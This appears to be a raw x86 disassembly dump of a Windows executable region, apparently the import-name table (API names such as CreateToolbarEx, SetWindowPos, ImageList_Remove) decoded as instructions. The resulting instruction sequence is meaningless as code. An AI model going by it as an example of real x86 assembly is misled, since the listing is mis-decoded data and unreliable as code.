  42578d:	bound  eax,QWORD PTR [edx]
  42578f:	add    BYTE PTR [edx+eiz*2+0x2],dh
  425793:	add    BYTE PTR [edx-0x6bfffd9e],al
  425799:	bound  eax,QWORD PTR [edx]
  42579b:	add    BYTE PTR [eax-0x4bfffd9e],ch
  4257a1:	bound  eax,QWORD PTR [edx]
  4257a3:	add    dl,al
  4257a5:	bound  eax,QWORD PTR [edx]
  4257a7:	add    dl,dl
  4257a9:	bound  eax,QWORD PTR [edx]
  4257ab:	add    dl,ah
  4257ad:	bound  eax,QWORD PTR [edx]
  4257af:	add    al,bh
  4257b1:	bound  eax,QWORD PTR [edx]
  4257b3:	add    BYTE PTR [esi],al
  4257b5:	arpl   WORD PTR [edx],ax
  4257b7:	add    BYTE PTR [esi],dl
  4257b9:	arpl   WORD PTR [edx],ax
  4257bb:	add    BYTE PTR [eax],ch
  4257bd:	arpl   WORD PTR [edx],ax
  4257bf:	add    BYTE PTR [edx],bh
  4257c1:	arpl   WORD PTR [edx],ax
  4257c3:	add    BYTE PTR [esi+0x63],al
  4257c6:	add    al,BYTE PTR [eax]
  4257c8:	push   edx
  4257c9:	arpl   WORD PTR [edx],ax
  4257cb:	add    BYTE PTR [ebx+eiz*2+0x2],ah
  4257cf:	add    BYTE PTR [ebx+eiz*2+0x639a0002],al
  4257d6:	add    al,BYTE PTR [eax]
  4257d8:	mov    al,0x63
  4257da:	add    al,BYTE PTR [eax]
  4257dc:	les    esp,FWORD PTR [ebx+0x2]
  4257df:	add    dh,dl
  4257e1:	arpl   WORD PTR [edx],ax
  4257e3:	add    al,ch
  4257e5:	arpl   WORD PTR [edx],ax
  4257e7:	add    al,bh
  4257e9:	arpl   WORD PTR [edx],ax
  4257eb:	add    BYTE PTR [eax],cl
  4257ed:	add    al,BYTE PTR fs:[eax]
  4257f0:	sbb    BYTE PTR [edx+eax*1+0x0],ah
  4257f4:	sub    BYTE PTR [edx+eax*1+0x0],ah
  4257f8:	cmp    al,0x64
  4257fa:	add    al,BYTE PTR [eax]
  4257fc:	dec    edx
  4257fd:	add    al,BYTE PTR fs:[eax]
  425800:	push   0x78000264
  425805:	add    al,BYTE PTR fs:[eax]
  425808:	test   BYTE PTR [edx+eax*1+0x0],ah
  42580c:	add    BYTE PTR [eax],al
  42580e:	add    BYTE PTR [eax],al
  425810:	test   al,0x64
  425812:	add    al,BYTE PTR [eax]
  425814:	mov    dh,0x64
  425816:	add    al,BYTE PTR [eax]
  425818:	ret    0x264
  42581b:	add    dl,cl
  42581d:	add    al,BYTE PTR fs:[eax]
  425820:	aam    0x64
  425822:	add    al,BYTE PTR [eax]
  425824:	out    0x64,al
  425826:	add    al,BYTE PTR [eax]
  425828:	hlt    
  425829:	add    al,BYTE PTR fs:[eax]
  42582c:	(bad)  
  42582d:	add    al,BYTE PTR fs:[eax]
  425830:	or     BYTE PTR [ebp+0x2],ah
  425833:	add    BYTE PTR [edx],dl
  425835:	add    al,BYTE PTR gs:[eax]
  425838:	and    ah,BYTE PTR [ebp+0x2]
  42583b:	add    BYTE PTR [eax],dh
  42583d:	add    al,BYTE PTR gs:[eax]
  425840:	cmp    al,0x65
  425842:	add    al,BYTE PTR [eax]
  425844:	inc    esi
  425845:	add    al,BYTE PTR gs:[eax]
  425848:	push   esp
  425849:	add    al,BYTE PTR gs:[eax]
  42584c:	pop    esp
  42584d:	add    al,BYTE PTR gs:[eax]
  425850:	data16 add al,BYTE PTR gs:[eax]
  425854:	jo     0x4258bb
  425856:	add    al,BYTE PTR [eax]
  425858:	jl     0x4258bf
  42585a:	add    al,BYTE PTR [eax]
  42585c:	test   BYTE PTR [ebp+0x2],ah
  42585f:	add    BYTE PTR [edx-0x63fffd9b],dl
  425865:	add    al,BYTE PTR gs:[eax]
  425868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425869:	add    al,BYTE PTR gs:[eax]
  42586c:	scas   al,BYTE PTR es:[edi]
  42586d:	add    al,BYTE PTR gs:[eax]
  425870:	mov    eax,0xc2000265
  425875:	add    al,BYTE PTR gs:[eax]
  425878:	int3   
  425879:	add    al,BYTE PTR gs:[eax]
  42587c:	aam    0x65
  42587e:	add    al,BYTE PTR [eax]
  425880:	call   0xf2425aea
  425885:	add    al,BYTE PTR gs:[eax]
  425888:	cld    
  425889:	add    al,BYTE PTR gs:[eax]
  42588c:	push   es
  42588d:	data16 add al,BYTE PTR [eax]
  425890:	push   cs
  425891:	data16 add al,BYTE PTR [eax]
  425894:	push   ss
  425895:	data16 add al,BYTE PTR [eax]
  425898:	and    BYTE PTR [esi+0x2],ah
  42589b:	add    BYTE PTR [edx],ch
  42589d:	data16 add al,BYTE PTR [eax]
  4258a0:	xor    al,0x66
  4258a2:	add    al,BYTE PTR [eax]
  4258a4:	inc    eax
  4258a5:	data16 add al,BYTE PTR [eax]
  4258a8:	dec    esp
  4258a9:	data16 add al,BYTE PTR [eax]
  4258ac:	push   esi
  4258ad:	data16 add al,BYTE PTR [eax]
  4258b0:	pop    esi
  4258b1:	data16 add al,BYTE PTR [eax]
  4258b4:	outs   dx,BYTE PTR ds:[esi]
  4258b5:	data16 add al,BYTE PTR [eax]
  4258b8:	js     0x425920
  4258ba:	add    al,BYTE PTR [eax]
  4258bc:	and    BYTE PTR [esi+0x2],0x0
  4258c0:	add    BYTE PTR [eax],al
  4258c2:	add    BYTE PTR [eax],al
  4258c4:	call   0x266:0xaa000266
  4258cb:	add    al,al
  4258cd:	data16 add al,BYTE PTR [eax]
  4258d0:	aam    0x66
  4258d2:	add    al,BYTE PTR [eax]
  4258d4:	loopne 0x42593c
  4258d6:	add    al,BYTE PTR [eax]
  4258d8:	lock data16 add al,BYTE PTR [eax]
  4258dc:	add    al,0x67
  4258de:	add    al,BYTE PTR [eax]
  4258e0:	sbb    ah,BYTE PTR [edi+0x2]
  4258e3:	add    BYTE PTR [edx],ch
  4258e5:	add    al,BYTE PTR [bx+si]
  4258e8:	xor    al,0x67
  4258ea:	add    al,BYTE PTR [eax]
  4258ec:	inc    esi
  4258ed:	add    al,BYTE PTR [bx+si]
  4258f0:	push   eax
  4258f1:	add    al,BYTE PTR [bx+si]
  4258f4:	data16 add al,BYTE PTR [bx+si]
  4258f8:	jb     0x425961
  4258fa:	add    al,BYTE PTR [eax]
  4258fc:	jl     0x425965
  4258fe:	add    al,BYTE PTR [eax]
  425900:	xchg   BYTE PTR [edi+0x2],ah
  425903:	add    BYTE PTR [eax-0x5bfffd99],bl
  425909:	add    al,BYTE PTR [bx+si]
  42590c:	mov    eax,0xc8000267
  425911:	add    al,BYTE PTR [bx+si]
  425914:	(bad)  
  425915:	add    al,BYTE PTR [bx+si]
  425918:	jmp    0x267:0xf6000267
  42591f:	add    BYTE PTR [edx],cl
  425921:	push   0x68140002
  425926:	add    al,BYTE PTR [eax]
  425928:	and    ch,BYTE PTR [eax+0x2]
  42592b:	add    BYTE PTR [eax+ebp*2],ch
  42592e:	add    al,BYTE PTR [eax]
  425930:	cmp    BYTE PTR [eax+0x2],ch
  425933:	add    BYTE PTR [eax+ebp*2+0x2],cl
  425937:	add    BYTE PTR [esi+0x68],dl
  42593a:	add    al,BYTE PTR [eax]
  42593c:	ins    BYTE PTR es:[edi],dx
  42593d:	push   0x68780002
  425942:	add    al,BYTE PTR [eax]
  425944:	mov    BYTE PTR [eax+0x2],ch
  425947:	add    BYTE PTR [edx-0x57fffd98],bl
  42594d:	push   0x68b80002
  425952:	add    al,BYTE PTR [eax]
  425954:	les    ebp,FWORD PTR [eax+0x2]
  425957:	add    al,dl
  425959:	push   0x68e40002
  42595e:	add    al,BYTE PTR [eax]
  425960:	out    dx,al
  425961:	push   0x69060002
  425966:	add    al,BYTE PTR [eax]
  425968:	push   ds
  425969:	imul   eax,DWORD PTR [edx],0x2692a00
  42596f:	add    BYTE PTR [edx],bh
  425971:	imul   eax,DWORD PTR [edx],0x0
  425977:	add    BYTE PTR [edi+0x0],dl
  42597a:	dec    ecx
  42597b:	outs   dx,BYTE PTR ds:[esi]
  42597c:	imul   esi,DWORD PTR [ebx+eax*2+0x6f],0x6e6f6d6d
  425984:	inc    ebx
  425985:	outs   dx,DWORD PTR ds:[esi]
  425986:	outs   dx,BYTE PTR ds:[esi]
  425987:	je     0x4259fb
  425989:	outs   dx,DWORD PTR ds:[esi]
  42598a:	ins    BYTE PTR es:[edi],dx
  42598b:	jae    0x4259d2
  42598d:	js     0x42598f
  42598f:	add    BYTE PTR [eax+eax*1+0x49],cl
  425993:	ins    DWORD PTR es:[edi],dx
  425994:	popa   
  425995:	addr16 gs dec esp
  425998:	imul   esi,DWORD PTR [ebx+0x74],0x6d65525f
  42599f:	outs   dx,DWORD PTR ds:[esi]
  4259a0:	jbe    0x425a07
  4259a2:	add    BYTE PTR [eax],al
  4259a4:	push   ss
  4259a5:	add    BYTE PTR [ebx+0x72],al
  4259a8:	gs popa 
  4259aa:	je     0x425a11
  4259ac:	push   esp
  4259ad:	outs   dx,DWORD PTR ds:[esi]
  4259ae:	outs   dx,DWORD PTR ds:[esi]
  4259af:	ins    BYTE PTR es:[edi],dx
  4259b0:	bound  esp,QWORD PTR [ecx+0x72]
  4259b3:	inc    ebp
  4259b4:	js     0x4259b6
  4259b6:	add    BYTE PTR ds:[ecx+0x6d],cl
  4259ba:	popa   
  4259bb:	addr16 gs dec esp
  4259be:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  4259c5:	dec    ecx
  4259c6:	arpl   WORD PTR [edi+0x6e],bp
  4259c9:	add    BYTE PTR ds:0x65724300,dl
  4259cf:	popa   
  4259d0:	je     0x425a37
  4259d2:	push   ebx
  4259d3:	je     0x425a36
  4259d5:	je     0x425a4c
  4259d7:	jae    0x425a30
  4259d9:	imul   ebp,DWORD PTR [esi+0x64],0x57776f
  4259e0:	pop    ss
  4259e1:	add    BYTE PTR [ebp+eiz*2+0x73],al
  4259e5:	je     0x425a59
  4259e7:	outs   dx,DWORD PTR ds:[esi]
  4259e8:	jns    0x425a3a
  4259ea:	jb     0x425a5b
  4259ec:	jo     0x425a53
  4259ee:	jb     0x425a64
  4259f0:	jns    0x425a45
  4259f2:	push   0x50746565
  4259f7:	popa   
  4259f8:	add    BYTE PTR gs:[bx+si],al
  4259fc:	inc    ebx
  4259fd:	dec    edi
  4259fe:	dec    ebp
  4259ff:	inc    ebx
  425a00:	push   esp
  425a01:	dec    esp
  425a02:	xor    esi,DWORD PTR [edx]
  425a04:	cs fs ins BYTE PTR es:[edi],dx
  425a07:	ins    BYTE PTR es:[edi],dx
  425a08:	add    BYTE PTR [eax],al
  425a0a:	mov    cl,0x2
  425a0c:	push   esi
  425a0d:	imul   ecx,DWORD PTR [ebx+0x65],0x79
  425a11:	push   ebx
  425a12:	arpl   WORD PTR [ecx+0x6e],sp
  425a15:	push   edi
  425a16:	add    BYTE PTR [eax],al
  425a18:	push   ecx
  425a19:	add    dl,BYTE PTR [ebx+0x65]
  425a1c:	je     0x425a6e
  425a1e:	popa   
  425a1f:	jb     0x425a86
  425a21:	outs   dx,BYTE PTR ds:[esi]
  425a22:	je     0x425a24
  425a24:	sgdtd  [edi+0x65]
  425a28:	je     0x425a6e
  425a2a:	ins    BYTE PTR es:[edi],dx
  425a2b:	addr16 dec ecx
  425a2d:	je     0x425a94
  425a2f:	ins    DWORD PTR es:[edi],dx
  425a30:	add    BYTE PTR [eax],al
  425a32:	scas   eax,DWORD PTR es:[edi]
  425a33:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  425a37:	fs dec ecx
  425a39:	arpl   WORD PTR [edi+0x6e],bp
  425a3c:	inc    ecx
  425a3d:	add    BYTE PTR [ebx+0x2],bh
  425a40:	push   ebx
  425a41:	push   0x7543776f
  425a46:	jb     0x425abb
  425a48:	outs   dx,DWORD PTR ds:[esi]
  425a49:	jb     0x425a4b
  425a4b:	add    BYTE PTR ds:0x67655202,al
  425a51:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  425a58:	popa   
  425a59:	jae    0x425ace
  425a5b:	push   edi
  425a5c:	add    BYTE PTR [eax],al
  425a5e:	xchg   esp,eax
  425a5f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  425a63:	je     0x425ad7
  425a65:	outs   dx,DWORD PTR ds:[esi]
  425a66:	jns    0x425aab
  425a68:	popa   
  425a69:	jb     0x425ad0
  425a6b:	je     0x425a6d
  425a6d:	add    cl,bl
  425a6f:	add    DWORD PTR [ebp+0x6f],ecx
  425a72:	outs   dx,BYTE PTR ds:[esi]
  425a73:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  425a7b:	push   edx
  425a7c:	arpl   WORD PTR gs:[eax+eax*1-0x60],si
  425a81:	add    DWORD PTR [ecx+0x73],ecx
  425a84:	push   edi
  425a85:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  425a8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a8d:	add    DWORD PTR [ecx+0x73],ecx
  425a90:	pop    edx
  425a91:	outs   dx,DWORD PTR ds:[esi]
  425a92:	outs   dx,DWORD PTR ds:[esi]
  425a93:	ins    DWORD PTR es:[edi],dx
  425a94:	gs add BYTE PTR fs:[eax],al
  425a98:	aaa    
  425a99:	add    BYTE PTR [ebx+0x68],al
  425a9c:	popa   
  425a9d:	jb     0x425af4
  425a9f:	jo     0x425b11
  425aa1:	gs jb  0x425ae6
  425aa4:	jne    0x425b0c
  425aa6:	inc    cx
  425aa8:	add    BYTE PTR [eax],al
  425aaa:	inc    ecx
  425aab:	add    dl,BYTE PTR [ebx+0x65]
  425aae:	je     0x425af6
  425ab0:	outs   dx,DWORD PTR ds:[esi]
  425ab1:	arpl   WORD PTR [ebp+0x73],si
  425ab4:	add    BYTE PTR [eax],al
  425ab6:	cwde   
  425ab7:	add    DWORD PTR [ecx+0x73],ecx
  425aba:	inc    esp
  425abb:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  425ac2:	jae    0x425b37
  425ac4:	popa   
  425ac5:	addr16 gs push edi
  425ac8:	add    BYTE PTR [eax],al
  425aca:	loop   0x425acc
  425acc:	inc    esi
  425acd:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  425ad4:	outs   dx,DWORD PTR ds:[esi]
  425ad5:	ja     0x425b1c
  425ad7:	js     0x425b1a
  425ad9:	add    bl,bl
  425adb:	add    DWORD PTR [ebp+0x6f],ecx
  425ade:	jbe    0x425b45
  425ae0:	push   edi
  425ae1:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  425ae8:	mov    al,BYTE PTR [edx]
  425aea:	push   esp
  425aeb:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  425af3:	ja     0x425b68
  425af5:	add    BYTE PTR [ebx+0x61724400],dh
  425afb:	ja     0x425b46
  425afd:	arpl   WORD PTR [edi+0x6e],bp
  425b00:	add    BYTE PTR [eax],al
  425b02:	xchg   edi,eax
  425b03:	add    BYTE PTR [ebp+eiz*2+0x73],al
  425b07:	je     0x425b7b
  425b09:	outs   dx,DWORD PTR ds:[esi]
  425b0a:	jns    0x425b59
  425b0c:	outs   dx,BYTE PTR gs:[esi]
  425b0e:	jne    0x425b10
  425b10:	sbb    BYTE PTR [ecx],al
  425b12:	inc    edi
  425b13:	gs je  0x425b5f
  425b16:	arpl   WORD PTR [edi+0x6e],bp
  425b19:	dec    ecx
  425b1a:	outs   dx,BYTE PTR ds:[esi]
  425b1b:	outs   dx,WORD PTR ds:[esi]
  425b1d:	add    ch,bl
  425b1f:	add    BYTE PTR [ebp+0x71],al
  425b22:	jne    0x425b85
  425b24:	ins    BYTE PTR es:[edi],dx
  425b25:	push   edx
  425b26:	arpl   WORD PTR gs:[eax+eax*1+0x10],si
  425b2b:	add    DWORD PTR [edi+0x65],eax
  425b2e:	je     0x425b74
  425b30:	ins    BYTE PTR es:[edi],dx
  425b31:	addr16 dec ecx
  425b33:	je     0x425b9a
  425b35:	ins    DWORD PTR es:[edi],dx
  425b36:	dec    ecx
  425b37:	outs   dx,BYTE PTR ds:[esi]
  425b38:	je     0x425b3a
  425b3a:	rol    DWORD PTR [edx],0x77
  425b3d:	jbe    0x425bb2
  425b3f:	jo     0x425bb3
  425b41:	imul   ebp,DWORD PTR [esi+0x74],0x4166
  425b48:	inc    ebp
  425b49:	add    DWORD PTR [edi+0x65],eax
  425b4c:	je     0x425b9e
  425b4e:	popa   
  425b4f:	jb     0x425bb6
  425b51:	outs   dx,BYTE PTR ds:[esi]
  425b52:	je     0x425b54
  425b54:	sti    
  425b55:	add    DWORD PTR [eax+0x74],edx
  425b58:	dec    ecx
  425b59:	outs   dx,BYTE PTR ds:[esi]
  425b5a:	push   edx
  425b5b:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  425b60:	pop    edi
  425b61:	add    dl,BYTE PTR [ebx+0x65]
  425b64:	je     0x425bb9
  425b66:	jns    0x425bdb
  425b68:	inc    ebx
  425b69:	outs   dx,DWORD PTR ds:[esi]
  425b6a:	ins    BYTE PTR es:[edi],dx
  425b6b:	outs   dx,DWORD PTR ds:[esi]
  425b6c:	jb     0x425be1
  425b6e:	add    BYTE PTR [eax],al
  425b70:	hlt    
  425b71:	add    BYTE PTR [edi+0x65],al
  425b74:	je     0x425bb9
  425b76:	ins    BYTE PTR es:[edi],dx
  425b77:	popa   
  425b78:	jae    0x425bed
  425b7a:	dec    ecx
  425b7b:	outs   dx,BYTE PTR ds:[esi]
  425b7c:	outs   dx,WORD PTR ds:[esi]
  425b7e:	inc    ecx
  425b7f:	add    BYTE PTR [edx],cl
  425b81:	add    dl,BYTE PTR [edx+0x65]
  425b84:	imul   esi,DWORD PTR [bp+di+0x74],0x6f487265
  425b8c:	je     0x425bd9
  425b8e:	gs jns 0x425b91
  425b91:	add    BYTE PTR [esi+0x1],dl
  425b94:	inc    edi
  425b95:	gs je  0x425beb
  425b98:	arpl   WORD PTR [edx+0x6f],si
  425b9b:	ins    BYTE PTR es:[edi],dx
  425b9c:	ins    BYTE PTR es:[edi],dx
  425b9d:	push   edx
  425b9e:	popa   
  425b9f:	outs   dx,BYTE PTR ds:[esi]
  425ba0:	add    BYTE PTR gs:[bx+si],al
  425ba4:	test   al,0x1
  425ba6:	dec    esp
  425ba7:	outs   dx,DWORD PTR ds:[esi]
  425ba8:	popa   
  425ba9:	fs inc ecx
  425bab:	arpl   WORD PTR [ebx+0x65],sp
  425bae:	ins    BYTE PTR es:[edi],dx
  425baf:	gs jb  0x425c13
  425bb2:	je     0x425c23
  425bb4:	jb     0x425c29
  425bb6:	push   edi
  425bb7:	add    BYTE PTR [ecx+eax*1+0x47],dl
  425bbb:	gs je  0x425c11
  425bbe:	arpl   WORD PTR [edx+0x6f],si
  425bc1:	ins    BYTE PTR es:[edi],dx
  425bc2:	ins    BYTE PTR es:[edi],dx
  425bc3:	dec    ecx
  425bc4:	outs   dx,BYTE PTR ds:[esi]
  425bc5:	outs   dx,WORD PTR ds:[esi]
  425bc7:	add    BYTE PTR [edx],ch
  425bc9:	add    BYTE PTR [ebx+0x68],al
  425bcc:	popa   
  425bcd:	jb     0x425c1d
  425bcf:	gs js  0x425c46
  425bd2:	inc    ecx
  425bd3:	add    BYTE PTR [ecx],dl
  425bd5:	add    DWORD PTR [edi+0x65],eax
  425bd8:	je     0x425c1e
  425bda:	ins    BYTE PTR es:[edi],dx
  425bdb:	addr16 dec ecx
  425bdd:	je     0x425c44
  425bdf:	ins    DWORD PTR es:[edi],dx
  425be0:	push   esp
  425be1:	gs js  0x425c58
  425be4:	inc    ecx
  425be5:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  425bec:	outs   dx,DWORD PTR ds:[esi]
  425bed:	outs   dx,BYTE PTR ds:[esi]
  425bee:	imul   esp,DWORD PTR [ebx+0x0],0x53027a00
  425bf5:	push   0x6143776f
  425bfa:	jb     0x425c61
  425bfc:	je     0x425bfe
  425bfe:	cmp    eax,0x74655302
  425c03:	inc    esp
  425c04:	ins    BYTE PTR es:[edi],dx
  425c05:	addr16 dec ecx
  425c07:	je     0x425c6e
  425c09:	ins    DWORD PTR es:[edi],dx
  425c0a:	dec    ecx
  425c0b:	outs   dx,BYTE PTR ds:[esi]
  425c0c:	je     0x425c0e
  425c0e:	add    DWORD PTR [ecx],0x49
  425c11:	outs   dx,BYTE PTR ds:[esi]
  425c12:	jae    0x425c79
  425c14:	jb     0x425c8a
  425c16:	dec    ebp
  425c17:	outs   dx,BYTE PTR gs:[esi]
  425c19:	jne    0x425c5c
  425c1b:	add    BYTE PTR [ebx+0x0],ah
  425c1e:	inc    ebx
  425c1f:	jb     0x425c86
  425c21:	popa   
  425c22:	je     0x425c89
  425c24:	push   edi
  425c25:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  425c2c:	push   edi
  425c2d:	add    al,dl
  425c2f:	add    DWORD PTR [ebp+0x65],ecx
  425c32:	jae    0x425ca7
  425c34:	popa   
  425c35:	addr16 gs inc edx
  425c38:	outs   dx,DWORD PTR ds:[esi]
  425c39:	js     0x425c80
  425c3b:	js     0x425c94
  425c3d:	add    BYTE PTR [ebx],ch
  425c3f:	add    dl,BYTE PTR [ebx+0x65]
  425c42:	outs   dx,BYTE PTR ds:[esi]
  425c43:	fs dec ebp
  425c45:	gs jae 0x425cbb
  425c48:	popa   
  425c49:	addr16 gs push edi
  425c4c:	add    BYTE PTR [eax],al
  425c4e:	jl     0x425c52
  425c50:	push   ebx
  425c51:	push   0x774f776f
  425c56:	outs   dx,BYTE PTR ds:[esi]
  425c57:	gs fs push eax
  425c5a:	outs   dx,DWORD PTR ds:[esi]
  425c5b:	jo     0x425cd2
  425c5d:	jo     0x425cd2
  425c5f:	add    BYTE PTR [ebp+0x0],cl
  425c62:	inc    ebx
  425c63:	outs   dx,DWORD PTR ds:[esi]
  425c64:	jo     0x425cdf
  425c66:	push   edx
  425c67:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  425c6c:	xchg   ebx,eax
  425c6d:	add    BYTE PTR [ebp+eiz*2+0x73],al
  425c71:	je     0x425ce5
  425c73:	outs   dx,DWORD PTR ds:[esi]
  425c74:	jns    0x425cb7
  425c76:	arpl   WORD PTR [ebx+0x65],sp
  425c79:	ins    BYTE PTR es:[edi],dx
  425c7a:	gs jb  0x425cde
  425c7d:	je     0x425cee
  425c7f:	jb     0x425cd5
  425c81:	popa   
  425c82:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  425c86:	pop    ebx
  425c87:	add    DWORD PTR [edi+0x65],eax
  425c8a:	je     0x425cdf
  425c8c:	jns    0x425d01
  425c8e:	je     0x425cf5
  425c90:	ins    DWORD PTR es:[edi],dx
  425c91:	dec    ebp
  425c92:	outs   dx,BYTE PTR gs:[esi]
  425c94:	jne    0x425c96
  425c96:	ja     0x425c99
  425c98:	inc    edi
  425c99:	gs je  0x425cf3
  425c9c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  425ca3:	js     0x425d19
  425ca5:	dec    esp
  425ca6:	outs   dx,BYTE PTR gs:[esi]
  425ca8:	addr16 je 0x425d13
  425cab:	push   edi
  425cac:	add    BYTE PTR [eax],al
  425cae:	jmp    0x65b2abb4
  425cb3:	outs   dx,BYTE PTR ds:[esi]
  425cb4:	dec    ecx
  425cb5:	outs   dx,BYTE PTR ds:[esi]
  425cb6:	jo     0x425d2d
  425cb8:	je     0x425cfe
  425cba:	gs jae 0x425d28
  425cbd:	je     0x425d2e
  425cbf:	jo     0x425cc1
  425cc1:	add    bh,dl
  425cc3:	add    DWORD PTR [ebp+0x6f],ecx
  425cc6:	imul   esp,DWORD PTR fs:[esi+0x79],0x756e654d
  425cce:	push   edi
  425ccf:	add    BYTE PTR [eax+0x61725402],dl
  425cd5:	arpl   WORD PTR [ebx+0x50],bp
  425cd8:	outs   dx,DWORD PTR ds:[esi]
  425cd9:	jo     0x425d50
  425cdb:	jo     0x425d2a
  425cdd:	outs   dx,BYTE PTR gs:[esi]
  425cdf:	jne    0x425ce1
  425ce1:	add    BYTE PTR [edi],cl
  425ce3:	add    BYTE PTR [edx+0x72],al
  425ce6:	imul   ebp,DWORD PTR [esi+0x67],0x646e6957
  425ced:	outs   dx,DWORD PTR ds:[esi]
  425cee:	ja     0x425d44
  425cf0:	outs   dx,DWORD PTR ds:[esi]
  425cf1:	push   esp
  425cf2:	outs   dx,DWORD PTR ds:[esi]
  425cf3:	jo     0x425cf5
  425cf5:	add    BYTE PTR [edx+eax*1],al
  425cf8:	push   edx
  425cf9:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  425d02:	popa   
  425d03:	jae    0x425d78
  425d05:	inc    ebp
  425d06:	js     0x425d5f
  425d08:	add    BYTE PTR [eax],al
  425d0a:	outs   dx,BYTE PTR ds:[esi]
  425d0b:	add    dl,BYTE PTR [ebx+0x65]
  425d0e:	je     0x425d67
  425d10:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  425d17:	outs   dx,BYTE PTR ds:[esi]
  425d18:	addr16 push edi
  425d1a:	add    BYTE PTR [eax],al
  425d1c:	xchg   DWORD PTR [eax],eax
  425d1e:	inc    esp
  425d1f:	gs inc sp
  425d22:	ins    BYTE PTR es:[edi],dx
  425d23:	addr16 push eax
  425d25:	jb     0x425d96
  425d27:	arpl   WORD PTR [ecx+0x0],ax
  425d2a:	cmp    al,BYTE PTR [eax]
  425d2c:	inc    ebx
  425d2d:	push   0x446b6365
  425d32:	ins    BYTE PTR es:[edi],dx
  425d33:	addr16 inc edx
  425d35:	jne    0x425dab
  425d37:	je     0x425da8
  425d39:	outs   dx,BYTE PTR ds:[esi]
  425d3a:	add    BYTE PTR [eax],al
  425d3c:	stos   BYTE PTR es:[edi],al
  425d3d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  425d41:	fs inc edx
  425d43:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xc4005770
  425d4b:	add    DWORD PTR [ebp+0x61],ecx
  425d4e:	jo     0x425d94
  425d50:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  425d57:	arpl   WORD PTR [eax+eax*1-0x59],si
  425d5b:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  425d5f:	fs inc ecx
  425d61:	arpl   WORD PTR [ebx+0x65],sp
  425d64:	ins    BYTE PTR es:[edi],dx
  425d65:	gs jb  0x425dc9
  425d68:	je     0x425dd9
  425d6a:	jb     0x425ddf
  425d6c:	inc    ecx
  425d6d:	add    BYTE PTR [eax],ch
  425d6f:	add    DWORD PTR [edi+0x65],eax
  425d72:	je     0x425dc0
  425d74:	popa   
  425d75:	jae    0x425deb
  425d77:	inc    ecx
  425d78:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  425d7c:	gs push eax
  425d7e:	outs   dx,DWORD PTR ds:[esi]
  425d7f:	jo     0x425df6
  425d81:	jo     0x425d83
  425d83:	add    BYTE PTR [edx+eax*1+0x53],dh
  425d87:	gs je  0x425de1
  425d8a:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  425d91:	js     0x425e07
  425d93:	push   edi
  425d94:	add    BYTE PTR [eax],al
  425d96:	xor    al,BYTE PTR [edx]
  425d98:	push   ebx
  425d99:	gs je  0x425ddf
  425d9c:	popa   
  425d9d:	jb     0x425e04
  425d9f:	je     0x425df1
  425da1:	outs   dx,DWORD PTR ds:[esi]
  425da2:	jae    0x425da4
  425da4:	icebp  
  425da5:	add    DWORD PTR [eax+0x6f],edx
  425da8:	jae    0x425e1e
  425daa:	dec    ebp
  425dab:	gs jae 0x425e21
  425dae:	popa   
  425daf:	addr16 gs inc ecx
  425db2:	add    BYTE PTR [eax],al
  425db4:	mov    ebx,0x616f4c01
  425db9:	fs push ebx
  425dbb:	je     0x425e2f
  425dbd:	imul   ebp,DWORD PTR [esi+0x67],0x570041
  425dc4:	inc    ebx
  425dc5:	jb     0x425e2c
  425dc7:	popa   
  425dc8:	je     0x425e2f
  425dca:	inc    esp
  425dcb:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  425dd2:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  425dda:	jb     0x425e3d
  425ddc:	ins    DWORD PTR es:[edi],dx
  425ddd:	push   edi
  425dde:	add    BYTE PTR [eax],al
  425de0:	mov    ah,0x0
  425de2:	inc    esp
  425de3:	jb     0x425e46
  425de5:	ja     0x425e30
  425de7:	arpl   WORD PTR [edi+0x6e],bp
  425dea:	inc    ebp
  425deb:	js     0x425ded
  425ded:	add    BYTE PTR [eax+eax*1+0x77617244],bh
  425df4:	push   esp
  425df5:	gs js  0x425e6c
  425df8:	push   edi
  425df9:	add    BYTE PTR [edx+0x57734901],ah
  425dff:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  425e06:	imul   esp,DWORD PTR [ebx+0x6f],0xc2006564
  425e0d:	add    dh,BYTE PTR [edi+0x76]
  425e10:	jae    0x425e82
  425e12:	jb     0x425e7d
  425e14:	outs   dx,BYTE PTR ds:[esi]
  425e15:	je     0x425e7d
  425e17:	push   edi
  425e18:	add    BYTE PTR [eax],al
  425e1a:	push   edi
  425e1b:	add    dl,BYTE PTR [ebx+0x65]
  425e1e:	je     0x425e70
  425e20:	jb     0x425e91
  425e22:	jo     0x425e7b
  425e24:	add    BYTE PTR [eax],al
  425e26:	xchg   ebx,eax
  425e27:	add    dl,BYTE PTR [edx+esi*2+0x61]
  425e2b:	outs   dx,BYTE PTR ds:[esi]
  425e2c:	jae    0x425e9a
  425e2e:	popa   
  425e2f:	je     0x425e96
  425e31:	inc    ecx
  425e32:	arpl   WORD PTR [ebx+0x65],sp
  425e35:	ins    BYTE PTR es:[edi],dx
  425e36:	gs jb  0x425e9a
  425e39:	je     0x425eaa
